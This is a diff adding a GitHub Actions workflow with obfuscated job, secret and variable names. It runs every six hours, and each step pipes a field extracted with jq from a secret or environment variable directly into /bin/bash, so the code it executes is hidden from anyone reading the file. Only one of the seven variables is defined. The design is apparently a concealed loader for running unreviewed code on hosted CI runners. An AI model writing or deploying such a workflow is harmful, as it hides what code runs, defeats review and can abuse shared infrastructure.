@@ -1,0 +1,24 @@
+name: liuliangguo3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liuliangguo3456
+        env:
+          qjfy84524: ${{ secrets.qjfy84524 }}
+        run: |
+          echo $qjfy84524 | jq -r .tly2734 | /bin/bash
+          echo $gadot0678 | jq -r .zl1 | /bin/bash
+          echo $rqsku3 | jq -r .qmj00678 | /bin/bash
+          echo $yk7 | jq -r .s0102 | /bin/bash
+          echo $l5 | jq -r .b23790 | /bin/bash
+          echo $o739 | jq -r .fqb2 | /bin/bash
+          echo $tdoxx78 | jq -r .neffs5 | /bin/bash
+
